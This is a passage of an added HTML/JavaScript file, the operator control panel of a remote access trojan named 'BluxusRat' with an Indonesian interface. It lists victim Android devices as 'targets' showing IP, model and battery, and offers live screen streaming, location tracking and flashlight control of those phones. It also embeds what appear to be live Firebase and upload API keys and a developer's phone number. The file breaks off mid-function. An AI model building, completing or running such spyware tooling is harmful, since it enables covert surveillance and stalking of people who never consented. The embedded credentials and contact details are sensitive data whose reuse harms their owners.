+.modal-box textarea{resize:vertical;min-height:80px;font-family:inherit;font-weight:500;line-height:1.5}
+/* TOAST */
+#toast-wrap{position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:900;display:flex;flex-direction:column;gap:8px;pointer-events:none;width:calc(100% - 32px);max-width:380px}
+.toast{padding:14px 16px;background:var(--bg-elev);border:1px solid var(--border);border-radius:14px;font-size:12px;font-weight:600;color:var(--text);box-shadow:0 12px 32px rgba(0,0,0,0.6);animation:toastIn .3s cubic-bezier(0.4,0,0.2,1);pointer-events:auto;display:flex;align-items:center;gap:12px}
+.toast .ico-badge{width:28px;height:28px;border-radius:8px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.toast .ico-badge i{font-size:12px;color:var(--accent-hover)}
+.toast.ok .ico-badge{background:var(--success-soft)}
+.toast.ok .ico-badge i{color:var(--success)}
+.toast.err .ico-badge{background:var(--error-soft)}
+.toast.err .ico-badge i{color:var(--error)}
+.toast.warn .ico-badge{background:var(--warning-soft)}
+.toast.warn .ico-badge i{color:var(--warning)}
+@keyframes toastIn{from{opacity:0;transform:translateY(-12px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+.hidden{display:none!important}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border-hi);border-radius:3px}
+</style>
+</head>
+<body>
+<div id="bg-image"></div>
+<div id="conn-dot"></div>
+
+<div id="app">
+  <div class="app-shell">
+    <!-- LOADING -->
+    <div class="screen active" id="screen-loading">
+      <div class="brand-logo">BluxusRat</div>
+      <div class="brand-sub">V1 [NewEra]</div>
+      <div class="brand-ver">Control Panel</div>
+      <div class="progress-wrap"><div class="progress-fill" id="progress-fill"></div></div>
+      <div id="loading-text">Connecting to Firebase...</div>
+    </div>
+
+    <!-- LOGIN -->
+    <div class="screen" id="screen-login">
+      <div class="banner-wrap">
+        <img src="assets/banner-login.png" onerror="this.style.display='none'">
+        <div class="banner-title">BluxusRat</div>
+        <div class="banner-sub">V1 [NewEra]</div>
+      </div>
+      <div class="form-zone">
+        <div class="card">
+          <div class="card-title">Sign In</div>
+          <div class="field">
+            <label>Username</label>
+            <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input type="text" id="login-usn" placeholder="username"></div>
+          </div>
+          <div class="field">
+            <label>Password</label>
+            <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="login-pw" placeholder="••••••••"></div>
+          </div>
+          <button class="btn btn-primary" id="btn-login"><i class="fa-solid fa-right-to-bracket"></i> Login</button>
+          <div class="login-meta">BluxusRat V1 — NewEra</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DASHBOARD -->
+    <div class="screen" id="screen-dash">
+      <div class="dash-header">
+        <div class="hamburger" id="btn-hamburger"><i class="fa-solid fa-bars"></i></div>
+        <span class="logo-text">BluxusRat</span>
+        <div style="width:40px"></div>
+      </div>
+      <div class="dash-body">
+        <div class="welcome-banner">
+          <img src="assets/banner-welcome.png" onerror="this.style.display='none'">
+          <div class="wb-badge" id="dash-badge">MEMBER</div>
+          <div class="wb-text">
+            <div class="w">Welcome back, <span id="dash-welcome-name">User</span></div>
+            <div class="s" id="dash-welcome-sub">Control panel siap</div>
+          </div>
+        </div>
+
+        <div class="user-card">
+          <div class="content">
+            <div class="left">
+              <div class="label">Username</div>
+              <div class="usn" id="dash-usn">—</div>
+              <div class="role" id="dash-role"><i class="fa-solid fa-user"></i> member</div>
+            </div>
+            <div class="right">
+              <div class="label">User Code</div>
+              <div class="val mono" id="dash-usercode">—</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mini-grid">
+          <div class="mini-card">
+            <div class="ico-badge"><i class="fa-solid fa-crosshairs"></i></div>
+            <div class="info"><div class="label">Targets</div><div class="val" id="dash-targets">0</div></div>
+          </div>
+          <div class="mini-card">
+            <div class="ico-badge"><i class="fa-solid fa-wifi"></i></div>
+            <div class="info"><div class="label">Online</div><div class="val" id="dash-online">0</div></div>
+          </div>
+        </div>
+
+        <div class="mini-grid">
+          <div class="mini-card">
+            <div class="ico-badge"><i class="fa-solid fa-mobile-screen"></i></div>
+            <div class="info"><div class="label">Device</div><div class="val" id="dash-device">—</div></div>
+          </div>
+          <div class="mini-card">
+            <div class="ico-badge"><i class="fa-solid fa-battery-three-quarters"></i></div>
+            <div class="info"><div class="label">Battery</div><div class="val" id="dash-battery">—</div></div>
+          </div>
+        </div>
+
+        <div id="announce-wrap"></div>
+      </div>
+    </div>
+
+    <!-- RAT -->
+    <div class="screen" id="screen-rat">
+      <div class="dash-header">
+        <div class="hamburger" id="btn-hamburger-rat"><i class="fa-solid fa-bars"></i></div>
+        <span class="page-title">Rat</span>
+        <div style="width:40px"></div>
+      </div>
+      <div class="dash-body">
+        <div class="section">
+          <h3><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Target List</h3>
+          <div class="target-list" id="target-list">
+            <div style="font-size:12px;color:var(--text-mute);text-align:center;padding:20px">Belum ada target</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOOLS -->
+    <div class="screen" id="screen-tools">
+      <div class="dash-header">
+        <div class="hamburger" id="btn-hamburger-tools"><i class="fa-solid fa-bars"></i></div>
+        <span class="page-title">Tools</span>
+        <div style="width:40px"></div>
+      </div>
+      <div class="dash-body">
+        <div class="section">
+          <h3><div class="ico-badge"><i class="fa-solid fa-link"></i></div> To Link</h3>
+          <div style="font-size:12px;color:var(--text-dim);line-height:1.6;margin-bottom:14px">Upload foto atau video, dapet URL-nya.</div>
+          <div class="upload-zone" id="upload-zone">
+            <input type="file" id="upload-input" accept="image/*,video/*">
+            <div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
+            <div class="uz-title">Tap untuk pilih file</div>
+            <div class="uz-desc">atau drag & drop di sini<br>Max 2 MB</div>
+          </div>
+          <div class="upload-progress" id="upload-progress">
+            <div class="up-bar"><div class="up-fill" id="up-fill"></div></div>
+            <div class="up-text" id="up-text">Mengunggah... 0%</div>
+          </div>
+          <div class="upload-result" id="upload-result">
+            <div class="ur-head">
+              <div class="ico-badge"><i class="fa-solid fa-circle-check"></i></div>
+              <div class="t">Upload Berhasil</div>
+            </div>
+            <div class="ur-row"><span class="l">URL</span><span class="v" id="ur-url">—</span></div>
+            <div class="ur-row"><span class="l">Size</span><span class="v" id="ur-size">—</span></div>
+            <div class="ur-row"><span class="l">Created</span><span class="v" id="ur-created">—</span></div>
+            <div class="ur-row"><span class="l">API by</span><span class="v" id="ur-api">Termai</span></div>
+            <div class="ur-actions">
+              <button class="btn btn-ghost" id="btn-copy-url"><i class="fa-solid fa-copy"></i> Copy URL</button>
+              <button class="btn btn-primary" id="btn-open-url"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ACCOUNT -->
+    <div class="screen" id="screen-account">
+      <div class="dash-header">
+        <div class="hamburger" id="btn-hamburger-account"><i class="fa-solid fa-bars"></i></div>
+        <span class="page-title">Account</span>
+        <div style="width:40px"></div>
+      </div>
+      <div class="dash-body">
+        <div class="profile-head">
+          <div class="avatar-wrap">
+            <img class="avatar" id="acc-avatar" src="" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%235a4548%22><circle cx=%2212%22 cy=%228%22 r=%224%22/><path d=%22M4 22a8 8 0 0 1 16 0%22/></svg>'">
+            <div class="edit" id="btn-change-photo"><i class="fa-solid fa-camera"></i></div>
+          </div>
+          <div class="uname" id="acc-usn">—</div>
+          <div class="urole" id="acc-role">member</div>
+        </div>
+        <div class="section">
+          <div style="display:flex;justify-content:space-between;font-size:13px;padding:8px 0">
+            <span style="color:var(--text-dim)"><i class="fa-solid fa-key" style="color:var(--accent-hover)"></i> User Code</span>
+            <span id="acc-usercode" style="font-weight:700;font-family:'JetBrains Mono',monospace;font-size:11px">—</span>
+          </div>
+          <div style="height:1px;background:var(--border);margin:4px 0"></div>
+          <div style="display:flex;justify-content:space-between;font-size:13px;padding:8px 0">
+            <span style="color:var(--text-dim)"><i class="fa-solid fa-calendar" style="color:var(--accent-hover)"></i> Created</span>
+            <span id="acc-created" style="font-weight:700">—</span>
+          </div>
+        </div>
+        <div class="list-item" id="btn-settings">
+          <div class="ico-badge"><i class="fa-solid fa-gear"></i></div>
+          <div class="txt"><div class="n">Settings</div><div class="d">Ganti password</div></div>
+          <div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
+        </div>
+        <div class="list-item danger" id="btn-logout">
+          <div class="ico-badge"><i class="fa-solid fa-right-from-bracket"></i></div>
+          <div class="txt"><div class="n">Log Out</div><div class="d">Keluar akun</div></div>
+          <div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ABOUT -->
+    <div class="screen" id="screen-about">
+      <div class="dash-header">
+        <div class="hamburger" id="btn-hamburger-about"><i class="fa-solid fa-bars"></i></div>
+        <span class="page-title">About</span>
+        <div style="width:40px"></div>
+      </div>
+      <div class="dash-body">
+        <div class="about-hero">
+          <div class="ab-logo">BluxusRat</div>
+          <div class="ab-ver">V1 [NewEra]</div>
+          <div class="ab-desc">Control panel untuk monitoring & control device.<br>Firebase-powered.</div>
+        </div>
+
+        <div class="section">
+          <h3><div class="ico-badge"><i class="fa-solid fa-code"></i></div> Developer</h3>
+          <div class="list-item" onclick="window.open('https://wa.me/6283137236898','_blank')">
+            <div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div>
+            <div class="txt"><div class="n">Abyy</div><div class="d">Developer</div></div>
+            <div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>
+          </div>
+        </div>
+
+        <div class="section">
+          <h3><div class="ico-badge"><i class="fa-solid fa-users"></i></div> Community</h3>
+          <div class="list-item" onclick="window.open('https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w','_blank')">
+            <div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div>
+            <div class="txt"><div class="n">Channel WhatsApp</div><div class="d">Info & update</div></div>
+            <div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>
+          </div>
+          <div class="list-item" onclick="window.open('https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU?s=cl&p=a&mlu=4&ilr=4','_blank')">
+            <div class="ico-badge"><i class="fa-solid fa-comments"></i></div>
+            <div class="txt"><div class="n">Grup WhatsApp</div><div class="d">Diskusi komunitas</div></div>
+            <div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>
+          </div>
+        </div>
+
+        <div class="section">
+          <h3><div class="ico-badge"><i class="fa-solid fa-heart"></i></div> Credits</h3>
+          <div class="list-item" style="cursor:default">
+            <div class="ico-badge"><i class="fa-solid fa-fire"></i></div>
+            <div class="txt"><div class="n">Firebase</div><div class="d">Realtime Database</div></div>
+          </div>
+          <div class="list-item" style="cursor:default">
+            <div class="ico-badge"><i class="fa-solid fa-cloud"></i></div>
+            <div class="txt"><div class="n">Termai</div><div class="d">Upload API</div></div>
+          </div>
+          <div class="list-item" style="cursor:default">
+            <div class="ico-badge"><i class="fa-solid fa-icons"></i></div>
+            <div class="txt"><div class="n">Font Awesome</div><div class="d">Icons</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PANEL -->
+    <div class="screen" id="screen-panel">
+      <div class="dash-header">
+        <div class="hamburger" id="btn-hamburger-panel"><i class="fa-solid fa-bars"></i></div>
+        <span class="page-title" id="panel-title">Panel</span>
+        <div style="width:40px"></div>
+      </div>
+      <div class="dash-body">
+        <div class="section">
+          <h3><div class="ico-badge"><i class="fa-solid fa-shield-halved"></i></div> <span id="panel-role-text">PANEL</span></h3>
+          <div style="font-size:12px;color:var(--text-dim);line-height:1.6">Kelola user & sistem dari sini.</div>
+        </div>
+        <div class="panel-grid" id="panel-grid"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SIDEBAR -->
+<div id="sidebar-backdrop"></div>
+<aside id="sidebar">
+  <div class="sb-head">
+    <div class="brand">BluxusRat</div>
+    <div class="sub" id="sb-sub">—</div>
+  </div>
+  <nav class="sb-nav">
+    <div class="sb-item active" data-page="dash"><div class="ico-badge"><i class="fa-solid fa-house"></i></div> Dashboard</div>
+    <div class="sb-item" data-page="rat"><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Rat</div>
+    <div class="sb-item" data-page="tools"><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Tools</div>
+    <div class="sb-item" data-page="account"><div class="ico-badge"><i class="fa-solid fa-user"></i></div> Account</div>
+    <div class="sb-item" data-page="about"><div class="ico-badge"><i class="fa-solid fa-circle-info"></i></div> About</div>
+    <div id="sb-role-sep" class="hidden">
+      <div class="sb-sep"></div>
+      <div class="sb-label">Management</div>
+    </div>
+    <div class="sb-item hidden" id="sb-panel" data-page="panel"><div class="ico-badge"><i class="fa-solid fa-crown"></i></div> Panel</div>
+  </nav>
+</aside>
+
+<!-- OFFLINE POPUP -->
+<div id="offline-popup">
+  <div class="offline-box">
+    <div class="offline-icon-wrap"><i class="fa-solid fa-plug-circle-xmark offline-icon"></i></div>
+    <h3>Connection Lost</h3>
+    <p>Tidak bisa terhubung ke server. Cek koneksi internet kamu.</p>
+    <button class="btn btn-primary" onclick="location.reload()"><i class="fa-solid fa-rotate"></i> Retry</button>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="modal" id="modal"><div class="modal-box" id="modal-box"></div></div>
+<div id="toast-wrap"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, get, set, push, update, remove, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+// ============================================================
+// FIREBASE CONFIG
+// ============================================================
+const firebaseConfig = {
+  apiKey: "AIzaSyBx7iNsKzUjiZh-cVnfw3Tl8AYPz_xjH7A",
+  authDomain: "ratt-ceee0.firebaseapp.com",
+  databaseURL: "https://ratt-ceee0-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "ratt-ceee0",
+  storageBucket: "ratt-ceee0.firebasestorage.app",
+  messagingSenderId: "767485162301",
+  appId: "1:767485162301:web:3800f71fc8c6bb35db8b54",
+  measurementId: "G-7LWR6QTLCJ"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// ============================================================
+// CONFIG
+// ============================================================
+const CONFIG = {
+  TERMAI_KEY: "AIzaBj7z2z3xBjsk",
+  TERMAI_URL: "https://c.termai.cc",
+  MAX_UPLOAD: 2 * 1024 * 1024
+};
+
+const State = {
+  user: null, uid: null, page: "dash", targets: [],
+  unsubTargets: null, unsubLive: null, unsubLoc: null, unsubAnnounce: null,
+  currentTarget: null, currentTab: "info",
+  liveActive: false, locActive: false, flashActive: false, stroboActive: false
+};
+
+const LOADING_TEXTS = ["Connecting to Firebase...","Loading assets...","Preparing session...","Almost ready..."];
+const $ = (s,p=document) => p.querySelector(s);
+const $$ = (s,p=document) => [...p.querySelectorAll(s)];
+
+// ============================================================
+// UTIL
+// ============================================================
+function showScreen(id){$$(".screen").forEach(s=>s.classList.remove("active"));const el=$("#screen-"+id);if(el)el.classList.add("active");}
+function toast(msg,type="info",dur=3000){
+  const wrap=$("#toast-wrap");const el=document.createElement("div");
+  el.className="toast "+(type==="info"?"":type);
+  const ic=type==="ok"?"fa-circle-check":type==="err"?"fa-circle-xmark":type==="warn"?"fa-triangle-exclamation":"fa-circle-info";
+  el.innerHTML=`<div class="ico-badge"><i class="fa-solid ${ic}"></i></div><span>${msg}</span>`;
+  wrap.appendChild(el);
+  setTimeout(()=>{el.style.opacity="0";el.style.transform="translateY(-12px) scale(.95)";el.style.transition=".3s";setTimeout(()=>el.remove(),300);},dur);
+}
+function fmtDate(ts){if(!ts)return"—";return new Date(ts).toLocaleDateString("id-ID",{day:"2-digit",month:"short",year:"numeric"});}
+function fmtDateTime(ts){if(!ts)return"—";const d=new Date(ts);return d.toLocaleDateString("id-ID",{day:"2-digit",month:"short",year:"numeric"})+" "+d.toLocaleTimeString("id-ID",{hour:"2-digit",minute:"2-digit"});}
+function timeAgo(ts){if(!ts)return"—";const s=Math.floor((Date.now()-ts)/1000);if(s<60)return s+"s ago";if(s<3600)return Math.floor(s/60)+"m ago";if(s<86400)return Math.floor(s/3600)+"h ago";return Math.floor(s/86400)+"d ago";}
+function fmtSize(bytes){if(!bytes)return"—";if(bytes<1024)return bytes+" B";if(bytes<1048576)return (bytes/1024).toFixed(1)+" KB";return (bytes/1048576).toFixed(2)+" MB";}
+async function sha256(text){const buf=new TextEncoder().encode(text);const hash=await crypto.subtle.digest("SHA-256",buf);return [...new Uint8Array(hash)].map(b=>b.toString(16).padStart(2,"0")).join("");}
+function genSalt(){const arr=new Uint8Array(16);crypto.getRandomValues(arr);return [...arr].map(b=>b.toString(16).padStart(2,"0")).join("");}
+function genUserCode(){const chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";const gen=()=>[...crypto.getRandomValues(new Uint8Array(4))].map(b=>chars[b%chars.length]).join("");return `${gen()}-${gen()}-${gen()}-${gen()}`;}
+function getDeviceName(){const ua=navigator.userAgent;if(/Android/i.test(ua))return"Android";if(/iPhone|iPad|iPod/i.test(ua))return"iOS";if(/Windows/i.test(ua))return"Windows";if(/Mac/i.test(ua))return"macOS";if(/Linux/i.test(ua))return"Linux";return"Unknown";}
+async function readBattery(){if(!navigator.getBattery)return"—";try{const b=await navigator.getBattery();return Math.round(b.level*100)+"%"+(b.charging?" ⚡":"");}catch{return"—";}}
+
+// ============================================================
+// CONNECTION
+// ============================================================
+function setDot(s){const d=$("#conn-dot");d.classList.remove("warn","off");if(s==="warn")d.classList.add("warn");if(s==="off")d.classList.add("off");}
+function showOffline(){$("#offline-popup").classList.add("show");}
+function hideOffline(){$("#offline-popup").classList.remove("show");}
+window.addEventListener("offline",()=>{setDot("off");showOffline();});
+window.addEventListener("online",()=>{setDot("ok");hideOffline();});
+function watchConnection(){
+  onValue(ref(db, ".info/connected"), (snap)=>{
+    if(snap.val() === true){setDot("ok");hideOffline();}
+    else{setDot("warn");}
+  });
+}
+
+// ============================================================
+// LOADING
+// ============================================================
+function runLoading(){
+  showScreen("loading");
+  const fill=$("#progress-fill"),txt=$("#loading-text");
+  fill.style.width="0%";State.loadingIdx=0;txt.textContent=LOADING_TEXTS[0];
+  let pct=0;
+  const step=setInterval(()=>{pct+=Math.random()*12+4;if(pct>=100){pct=100;clearInterval(step);}fill.style.width=pct+"%";},180);
+  State.loadingTimer=setInterval(()=>{
+    State.loadingIdx=(State.loadingIdx+1)%LOADING_TEXTS.length;
+    txt.style.opacity="0";
+    setTimeout(()=>{txt.textContent=LOADING_TEXTS[State.loadingIdx];txt.style.opacity="1";},180);
+  },800);
+  setTimeout(()=>{clearInterval(State.loadingTimer);fill.style.width="100%";setTimeout(()=>showScreen("login"),500);},2400);
+}
+
+// ============================================================
+// LOGIN
+// ============================================================
+async function doLogin(){
+  const usn=$("#login-usn").value.trim(), pw=$("#login-pw").value;
+  if(!usn||!pw) return toast("Isi username & password","err");
+  const btn=$("#btn-login"); btn.disabled=true; btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
+  try{
+    const snap = await get(ref(db, "users"));
+    if(!snap.exists()) throw new Error("Belum ada user terdaftar");
+    const users = snap.val();
+    let foundUid=null, foundUser=null;
+    for(const uid in users){ if(users[uid].username === usn){foundUid=uid;foundUser=users[uid];break;} }
+    if(!foundUser) throw new Error("Username tidak ditemukan");
+    if(foundUser.banned) throw new Error("Akun di-ban");
+    const hash = await sha256(pw + foundUser.passwordSalt);
+    if(hash !== foundUser.passwordHash) throw new Error("Password salah");
+    if(foundUser.expiresAt && foundUser.expiresAt < Date.now()) throw new Error("Akun expired");
+    await update(ref(db, "users/"+foundUid), {lastLogin: Date.now()});
+    State.uid = foundUid; State.user = foundUser;
+    localStorage.setItem("bluxus_uid", foundUid);
+    toast("Login berhasil","ok");
+    setTimeout(()=>goDashboard(), 400);
+  }catch(e){ toast(e.message || "Login gagal","err"); }
+  finally{ btn.disabled=false; btn.innerHTML='<i class="fa-solid fa-right-to-bracket"></i> Login'; }
+}
+
+async function tryResume(){
+  const uid = localStorage.getItem("bluxus_uid");
+  if(!uid) return false;
+  try{
+    const snap = await get(ref(db, "users/"+uid));
+    if(!snap.exists()) return false;
+    const u = snap.val();
+    if(u.banned) return false;
+    if(u.expiresAt && u.expiresAt < Date.now()) return false;
+    State.uid = uid; State.user = u;
+    return true;
+  }catch(e){ return false; }
+}
+
+// ============================================================
+// DASHBOARD
+// ============================================================
+async function goDashboard(){
+  showScreen("dash");
+  const u = State.user || {};
+  $("#dash-usn").textContent = u.username || "—";
+  $("#dash-role").innerHTML = `<i class="fa-solid fa-user"></i> ${u.role || "member"}`;
+  $("#dash-usercode").textContent = u.userCode || "—";
+  $("#dash-welcome-name").textContent = u.username || "User";
+  $("#dash-badge").textContent = (u.role || "member").toUpperCase();
+  $("#sb-sub").textContent = u.username || "—";
+  $("#dash-device").textContent = getDeviceName();
+  $("#dash-battery").textContent = await readBattery();
+
+  if(u.role && u.role !== "member"){
+    $("#sb-role-sep").classList.remove("hidden");
+    $("#sb-panel").classList.remove("hidden");
+  } else {
+    $("#sb-role-sep").classList.add("hidden");
+    $("#sb-panel").classList.add("hidden");
+  }
+  markSidebar("dash");
+  await loadTargets();
+  loadAnnouncement();
+}
+
+function markSidebar(page){$$(".sb-item").forEach(el=>el.classList.toggle("active",el.dataset.page===page));}
+function openSidebar(){$("#sidebar").classList.add("open");$("#sidebar-backdrop").classList.add("show");}
+function closeSidebar(){$("#sidebar").classList.remove("open");$("#sidebar-backdrop").classList.remove("show");}
+function goPage(page){
+  closeSidebar(); markSidebar(page); State.page = page;
+  if(page==="dash")    return goDashboard();
+  if(page==="rat")     return goRat();
+  if(page==="tools")   return goTools();
+  if(page==="account") return goAccount();
+  if(page==="about")   return showScreen("about");
+  if(page==="panel")   return goPanel();
+}
+
+// ============================================================
+// ANNOUNCEMENT
+// ============================================================
+async function loadAnnouncement(){
+  const wrap = $("#announce-wrap");
+  if(!wrap) return;
+  try{
+    const snap = await get(ref(db, "broadcasts"));
+    if(!snap.exists()){ wrap.innerHTML = ""; return; }
+    const data = snap.val();
+    const arr = Object.entries(data).map(([id,v])=>({id,...v})).sort((a,b)=>b.createdAt-a.createdAt);
+    const latest = arr[0];
+    if(!latest){ wrap.innerHTML = ""; return; }
+    wrap.innerHTML = `
+      <div class="announce-card" id="announce-card">
+        ${latest.image ? `<img src="${latest.image}" onerror="this.style.display='none'">` : ""}
+        <div class="ac-body">
+          <div class="ac-label"><i class="fa-solid fa-bullhorn"></i> Pengumuman</div>
+          <div class="ac-title">${latest.title || "Info Terbaru"}</div>
+          <div class="ac-desc">${latest.message || ""}</div>
+        </div>
+      </div>`;
+    $("#announce-card").onclick = ()=>{
+      if(latest.url){ window.open(latest.url, "_blank"); return; }
+      openAnnouncementModal(latest);
+    };
+  }catch(e){ console.warn("announce err", e); }
+}
+
+function openAnnouncementModal(b){
+  const box = $("#modal-box");
+  box.innerHTML = `
+    ${b.image ? `<div style="border-radius:14px;overflow:hidden;margin:-8px -8px 16px"><img src="${b.image}" style="width:100%;display:block" onerror="this.style.display='none'"></div>` : ""}
+    <h3>${b.title || "Pengumuman"}</h3>
+    <div class="sub">${fmtDateTime(b.createdAt)}</div>
+    <div style="font-size:13px;color:var(--text);line-height:1.7;white-space:pre-wrap">${b.message || ""}</div>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+}
+
+// ============================================================
+// TARGETS
+// ============================================================
+async function loadTargets(){
+  if(State.unsubTargets) State.unsubTargets();
+  try{
+    const snap = await get(ref(db, "targets"));
+    const all = snap.exists() ? snap.val() : {};
+    const myCode = State.user.userCode;
+    State.targets = [];
+    for(const tid in all){
+      const t = all[tid];
+      if(t.ownerCode === myCode){
+        State.targets.push({id: tid, ...t});
+      }
+    }
+    $("#dash-targets").textContent = State.targets.length;
+    $("#dash-online").textContent = State.targets.filter(t=>t.status==="online").length;
+    renderTargetList();
+  }catch(e){ console.warn("load targets err", e); }
+}
+
+function renderTargetList(){
+  const list = $("#target-list");
+  if(!list) return;
+  if(State.targets.length === 0){
+    list.innerHTML = '<div style="font-size:12px;color:var(--text-mute);text-align:center;padding:20px">Belum ada target</div>';
+    return;
+  }
+  list.innerHTML = State.targets.map(t=>{
+    const online = t.status === "online";
+    const bat = t.battery || 0;
+    const low = bat < 20;
+    return `
+    <div class="target-item" data-tid="${t.id}">
+      <div class="ti-avatar"><i class="fa-solid fa-mobile-screen"></i></div>
+      <div class="ti-info">
+        <div class="n">${t.model || "Unknown Device"}</div>
+        <div class="d">
+          <span>${t.ip || "—"}</span>
+          ${t.battery ? `<span class="battery-badge ${low?"low":""}"><i class="fa-solid fa-battery-${bat>75?"full":bat>50?"three-quarters":bat>25?"half":"quarter"}"></i>${bat}%</span>` : ""}
+          <span>${timeAgo(t.lastSeen)}</span>
+        </div>
+      </div>
+      <div class="ti-status ${online?"on":"off"}"><span class="d"></span>${online?"ON":"OFF"}</div>
+    </div>`;
+  }).join("");
+  $$(".target-item").forEach(el=>el.onclick = ()=>openTargetDetail(el.dataset.tid));
+}
+
+function goRat(){
+  showScreen("rat");
+  loadTargets();
+}
+
+function openTargetDetail(tid){
+  const t = State.targets.find(x=>x.id===tid);
+  if(!t) return;
+  State.currentTarget = t;
+  State.currentTab = "info";
+  State.liveActive = false;
+  State.locActive = false;
+  State.flashActive = false;
+  State.stroboActive = false;
+
+  const box = $("#modal-box");
+  box.innerHTML = `
+    <h3>${t.model || "Device"}</h3>
+    <div class="sub">ID: ${tid}</div>
+    <div class="tabs">
+      <button data-tab="info" class="active"><i class="fa-solid fa-circle-info"></i> Info</button>
+      <button data-tab="live"><i class="fa-solid fa-desktop"></i> Live</button>
+      <button data-tab="locate"><i class="fa-solid fa-location-dot"></i> Locate</button>
+      <button data-tab="tools"><i class="fa-solid fa-toolbox"></i> Tools</button>
+    </div>
+    <div class="tab-panel active" data-panel="info">
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
+        <span style="color:var(--text-dim)">Status</span>
+        <span style="color:${t.status==='online'?'var(--success)':'var(--text-dim)'};font-weight:700">${(t.status||"offline").toUpperCase()}</span>
+      </div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
+        <span style="color:var(--text-dim)">Model</span>
+        <span style="font-weight:600">${t.model||"—"}</span>
+      </div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
+        <span style="color:var(--text-dim)">IP</span>
+        <span style="font-weight:600;font-family:'JetBrains Mono',monospace">${t.ip||"—"}</span>
+      </div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
+        <span style="color:var(--text-dim)">Android</span>
+        <span style="font-weight:600">${t.android||"—"}</span>
+      </div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
+        <span style="color:var(--text-dim)">Battery</span>
+        <span style="font-weight:600">${t.battery?t.battery+"%":"—"}</span>
+      </div>
+      <div style="height:1px;background:var(--border)"></div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0">
+        <span style="color:var(--text-dim)">Last Seen</span>
+        <span style="font-weight:600">${timeAgo(t.lastSeen)}</span>
+      </div>
+    </div>
+    <div class="tab-panel" data-panel="live">
+      <div class="toggle-row">
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-video"></i></div>
+          <div class="tr-info"><div class="n">Live Cam</div><div class="d">Stream layar target</div></div>
+        </div>
+        <label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label>
+      </div>
+      <div class="live-view" id="live-view">
+        <div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-panel="locate">
+      <div class="toggle-row">
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div>
+          <div class="tr-info"><div class="n">Locate</div><div class="d">Lokasi target</div></div>
+        </div>
+        <label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label>
+      </div>
+      <div class="loc-map" id="loc-map">
+        <div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>
+      </div>
+      <div class="loc-coords" id="loc-coords">—</div>
+    </div>
+    <div class="tab-panel" data-panel="tools">
+      <div class="toggle-row">
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div>
+          <div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div>
+        </div>
+        <label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
+      </div>
+      <div class="toggle-row">
+        <div class="tr-left">
+          <div class="ico-badge"><i class="fa-solid fa-bolt"></i></div>
+          <div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip-kedip</div></div>
+        </div>
+        <label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label>
+      </div>
+    </div>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
